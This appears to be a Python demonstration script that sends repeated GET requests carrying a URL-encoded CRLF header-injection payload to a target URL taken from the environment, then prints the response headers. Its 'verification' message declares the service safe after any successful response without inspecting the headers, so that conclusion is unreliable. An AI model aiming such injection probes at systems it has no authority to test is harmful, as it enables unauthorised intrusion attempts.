import requests
import time
import json
import urllib.parse

import os
from dotenv import load_dotenv
load_dotenv()
from requests.exceptions import RequestException

TARGET_URL = os.getenv("TARGET_URL")
REQUEST_COUNT = 10
ATTACK_HEADER_KEY = "Target-Header"

# The core of the attack: Injecting CRLF (\r\n) followed by a new header.
# We use the raw characters here. When encoded, they become %0d%0a in the URL.
# In a truly vulnerable application, the server would interpret \r\n as a header break.
INJECTED_PAYLOAD = "legit-value\r\nInjected-Header: CRLF-Success"

def send_crlf_simulation_requests(url, count, header_key, payload):
    """
    Sends requests to simulate how a CRLF injection payload is constructed 
    and transmitted via a query parameter.

    In a vulnerable server: The server uses the parameter value to set a response
    header. The embedded \r\n causes the server to prematurely end the current
    header and inject a new, malicious header line.
    """
    
    # 1. URL-encode the payload for safe transmission as a query parameter value
    encoded_payload = urllib.parse.quote(payload)
    
    # 2. Construct the full URL for the demonstration
    # This simulates a vulnerable link: target.com/page?Target-Header=payload
    full_url = f"{url}?{header_key}={encoded_payload}"
    
    print(f"Starting {count} GET requests to simulate CRLF injection.")
    print(f"Target Endpoint (Safe Test): {url}")
    print(f"Injected Payload (CRLF represented by \\r\\n): {repr(payload)}")
    print(f"Full Request URL (Encoded): {full_url}\n")
    
    for i in range(1, count + 1):
        print(f"--- Request {i}/{count} ---")
        try:
            # Use the GET method with the specially constructed URL
            response = requests.request("GET", full_url, timeout=5)
            
            # Check for successful response (status codes in the 200s)
            if response.ok:
                print(f"Status Code: {response.status_code} (OK)")
                
                print("\nResponse Headers Received (Server's View):")
                print("==============================================")
                
                # Print all headers. webserver safely reflect the URL-encoded 
                # value in the 'Target-Header' response header without breaking the response.
                for header, value in response.headers.items():
                    print(f"{header}: {value}")
                    
                print("==============================================\n")
                print("Verification Note:")
                print(f"The safe service {TARGET_URL} correctly sanitizes the input and")
                print("includes the literal encoded CRLF in the header value.")
                print("A vulnerable application would mistakenly terminate the 'Target-Header'")
                print("and process 'Injected-Header: CRLF-Success' as a completely new header.")

            else:
                print(f"Status Code: {response.status_code} (Error)")
                print(f"Response Content: {response.text[:150]}...\n")
                
        except RequestException as e:
            # Handle network errors, timeouts, or DNS failures
            print(f"An error occurred during the request: {e}\n")
            
        # Optional: Add a small delay between requests
        time.sleep(0.1)

if __name__ == "__main__":
    send_crlf_simulation_requests(TARGET_URL, REQUEST_COUNT, ATTACK_HEADER_KEY, INJECTED_PAYLOAD)
    print("Script finished.")

